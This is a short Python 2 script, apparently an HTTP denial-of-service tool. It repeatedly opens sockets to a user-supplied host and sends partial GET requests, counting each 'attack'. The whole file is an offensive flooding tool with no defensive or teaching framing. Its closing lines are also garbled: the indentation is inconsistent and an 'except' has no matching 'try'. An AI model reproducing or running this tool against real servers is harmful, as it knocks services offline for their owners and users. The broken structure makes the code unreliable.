import socket
import random
import sys
import time
running = True
count = 0
class httpDos():
    def __init__(self, host, port=80):
        self.host = host
        self.port = port
        self.run(host, port)
    def run(self, host, port):
        while running:
            ip = socket.gethostbyname(host)
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            msg = 'Null'
            try:
                dos.connect((host, 80))
                dos.send("GET / HTTP/1.1\r\n")
                dos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
                global count; count+=1
            except socket.error:
                print ("[!] Unknown Host")
                dos.close()
                sys.exit(1)
	host = raw_input("Enter the Host: ")
	port = input("Port No:  ");
	httpDos(host,port)
	except KeyboardInterrupt:
		print "\n[!] Process Interrupted"
		print "Attacked ", count, " times."
sys.exit(0)
